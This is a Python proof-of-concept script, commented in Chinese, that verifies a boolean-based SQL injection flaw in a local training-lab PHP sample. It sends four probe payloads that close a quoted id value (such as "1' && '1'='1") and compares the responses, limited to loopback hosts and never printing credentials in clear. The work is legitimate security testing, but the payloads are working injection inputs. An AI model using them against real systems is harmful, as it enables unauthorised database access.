#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""SQLI-003 本地授权靶场 SQL 注入验证草案（仅限本机回环地址）。

代码依据（归一化样本 SQLI-003.php，1 起始行号）:
  L5   if(isset($_GET['id']))                                    入口分支
  L7   $id=$_GET['id'];                                          GET 参数 id 完全可控
  L13  $id= blacklist($id);                                      仅删除子串 "or"/"AND"
  L16  $sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";      字符串拼接进单引号值位
  L17  $result=mysql_query($sql);                                执行
  L19-26 命中行输出 Your Login name / Your Password; L30 空结果输出 mysql_error()

用法:
  python sqli003_poc.py --base http://127.0.0.1:8080 --path /sqli/ \
      --param id --session-file ./cookie.txt

约定:
  * 参数名 id 来自代码; 请求路径未在片段中出现, 必须由 --path 由人工给出。
  * 仅发送 4 个探测请求, 不枚举数据库、不导出数据、不批量写入。
  * 不打印 Cookie、口令或完整凭据; 用户名/口令只打印长度与 SHA-256 前缀。
  * 只允许 localhost/127.0.0.1/::1, 不跟随重定向, 单请求超时。
"""
import argparse
import hashlib
import http.cookiejar
import re
import ssl
import sys
import urllib.error
import urllib.parse
import urllib.request

ALLOWED_HOSTS = {"localhost", "127.0.0.1", "::1"}
RE_LOGIN = re.compile(r'Your Login name:\s*([^<\r\n]*)')
RE_PASS = re.compile(r'Your Password:\s*([^<\r\n]*)')
RE_HINT = re.compile(r'Hint: Your Input is Filtered with following result:\s*([^<\r\n]*)')
RE_ERRBOX = re.compile(r'<font color=\s*"#FFFF00">(.*?)</font>', re.S | re.I)
RE_PHP_ERR = re.compile(r'(Fatal error|Parse error|Warning:\s*(mysql_|mysqli_)|Call to undefined function)', re.I)

PROBES = (
    ("baseline", "1", "基线数字 id, 期望命中 id=1 的行"),
    ("true_cond", "1' && '1'='1", "闭合单引号 + 恒真条件, 期望仍命中同一行"),
    ("false_cond", "1' && '1'='2", "同一结构 + 恒假条件, 期望无命中行"),
    ("quote_break", "1'", "仅闭合单引号, 期望出现 SQL 语法错误文本"),
)


class _NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def make_opener(cookie_file, insecure):
    jar = http.cookiejar.MozillaCookieJar()
    if cookie_file:
        try:
            jar.load(cookie_file, ignore_discard=True, ignore_expires=True)
        except (OSError, http.cookiejar.LoadError) as exc:
            print("[!] 会话文件加载失败(%s); 以未登录状态继续。" % type(exc).__name__)
            print("    若响应被重定向到登录页, 属于前置条件失败, 不能解释为过滤/编码生效。")
    handlers = [urllib.request.HTTPCookieProcessor(jar), _NoRedirect()]
    if insecure:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        handlers.append(urllib.request.HTTPSHandler(context=ctx))
    return urllib.request.build_opener(*handlers)


def validate_base(base):
    parts = urllib.parse.urlsplit(base)
    if parts.scheme not in ("http", "https"):
        sys.exit("[!] --base 必须是 http/https 地址")
    host = (parts.hostname or "").lower()
    if host not in ALLOWED_HOSTS:
        sys.exit("[!] 仅允许本地回环目标, 拒绝主机: %s" % host)
    return parts


def request_once(opener, url, timeout):
    req = urllib.request.Request(url, method="GET", headers={"User-Agent": "sqli003-poc/1.0"})
    try:
        with opener.open(req, timeout=timeout) as resp:
            return {"kind": "response",
                    "status": getattr(resp, "status", resp.getcode()),
                    "body": resp.read().decode("utf-8", "replace"),
                    "detail": None}
    except urllib.error.HTTPError as exc:
        try:
            body = exc.read().decode("utf-8", "replace")
        except Exception:
            body = ""
        location = exc.headers.get("Location") if exc.headers else None
        return {"kind": "http_error", "status": exc.code, "body": body,
                "detail": ("Location: %s" % location) if location else None}
    except urllib.error.URLError as exc:
        return {"kind": "connection_error", "status": None, "body": "",
                "detail": str(exc.reason)}
    except OSError as exc:
        return {"kind": "timeout_or_io", "status": None, "body": "", "detail": str(exc)}


def digest(value):
    return hashlib.sha256(value.encode("utf-8", "replace")).hexdigest()[:12]


def analyse(body):
    login = RE_LOGIN.search(body)
    pwd = RE_PASS.search(body)
    hint = RE_HINT.search(body)
    errbox = RE_ERRBOX.search(body)
    err_text = errbox.group(1).strip() if errbox else ""
    return {
        "row_present": bool(login) and bool(pwd),
        "login_len": len(login.group(1).strip()) if login else 0,
        "login_digest": digest(login.group(1).strip()) if login else None,
        "pwd_len": len(pwd.group(1).strip()) if pwd else 0,
        "filtered_hint": hint.group(1).strip() if hint else None,
        "db_error_text": err_text,
        "empty_error_box": bool(errbox) and err_text == "",
        "php_interface_error": bool(RE_PHP_ERR.search(body)),
    }


def main():
    ap = argparse.ArgumentParser(description="SQLI-003 本地 SQL 注入验证草案")
    ap.add_argument("--base", required=True, help="靶场基址, 例如 http://127.0.0.1:8080")
    ap.add_argument("--path", required=True, help="样本所在路径, 来自部署环境(片段未给出)")
    ap.add_argument("--param", default="id", help="GET 参数名, 代码中的名称为 id")
    ap.add_argument("--session-file", default=None, help="Netscape 格式 Cookie 文件, 不写入版本库")
    ap.add_argument("--timeout", type=float, default=10.0, help="单请求超时秒数")
    ap.add_argument("--insecure", action="store_true", help="本地自签名 HTTPS 时跳过证书校验")
    args = ap.parse_args()

    parts = validate_base(args.base)
    opener = make_opener(args.session_file, args.insecure)
    endpoint = "%s://%s/%s" % (parts.scheme, parts.netloc, args.path.lstrip("/"))

    results = {}
    for name, payload, note in PROBES:
        query = urllib.parse.urlencode({args.param: payload})
        raw = request_once(opener, "%s?%s" % (endpoint, query), args.timeout)
        if raw["kind"] == "response":
            info = analyse(raw["body"])
        else:
            info = {"row_present": False, "login_len": 0, "login_digest": None,
                    "pwd_len": 0, "filtered_hint": None, "db_error_text": "",
                    "empty_error_box": False, "php_interface_error": False}
        results[name] = {"payload": payload, "note": note, "transport": raw, "obs": info}
        print("[%s] payload=%r" % (name, payload))
        print("    transport=%s status=%s%s" % (
            raw["kind"], raw["status"],
            "" if not raw["detail"] else " detail=%s" % raw["detail"]))
        if raw["kind"] == "response":
            o = info
            print("    row_present=%s login_len=%s pwd_len=%s login_digest=%s" % (
                o["row_present"], o["login_len"], o["pwd_len"], o["login_digest"]))
            if o["filtered_hint"] is not None:
                print("    filtered_hint=%r" % o["filtered_hint"])
            if o["db_error_text"]:
                print("    db_error_text=%r" % o["db_error_text"][:160])
            if o["php_interface_error"]:
                print("    php_interface_error=True")

    print("")
    print("== 判定辅助(仅本地观测, 不代替人工核验) ==")
    transport_kinds = {r["transport"]["kind"] for r in results.values()}
    if transport_kinds - {"response"}:
        print("1) 前置条件失败: 至少一个请求不是正常响应(%s); 连接/超时/重定向不能解释为过滤生效。"
              % ",".join(sorted(transport_kinds - {"response"})))
    if any(r["obs"]["php_interface_error"] for r in results.values()):
        print("2) PHP 接口不兼容: 响应含 Fatal error/undefined function, 需先修正运行环境。")
    base = results["baseline"]["obs"]
    tru = results["true_cond"]["obs"]
    fal = results["false_cond"]["obs"]
    if not base["row_present"]:
        print("3) 基线未命中: 检查 --path/--param 是否正确、id=1 是否存在、是否被重定向到登录页。")
    else:
        print("3) 基线命中: login_digest=%s pwd_len=%s" % (
            base["login_digest"], base["pwd_len"]))
        if tru["row_present"] and tru["login_digest"] == base["login_digest"] and not fal["row_present"]:
            print("4) 观测到布尔差分: 真条件沿用基线命中行, 假条件无命中行;")
            print("   该差异只在注入改变查询语义时出现, 仍需人工回看原始响应。")
        elif tru["row_present"] and fal["row_present"]:
            print("4) 真/假条件均命中: 可能字段被提前截断或引号被转义, 差分不成立。")
        else:
            print("4) 未观测到可区分的布尔差分: 检查引号是否被转义(magic_quotes/全局过滤)或 WAF 拦截。")
    q = results["quote_break"]["obs"]
    print("5) 引号诊断: db_error_text=%r" % (
        q["db_error_text"][:160] if q["db_error_text"] else ""))
    print("   注意: 仅出现 SQL 错误文本只说明错误回显, 不能单独证明注入可利用;")
    print("   以 3)/4) 的行命中差异为主证据, 错误文本用于排除语法假设。")
    print("")
    print("提示: 运行结束后人工保存命令、环境、响应与截图; 不导出数据库内容。")


if __name__ == "__main__":
    main()
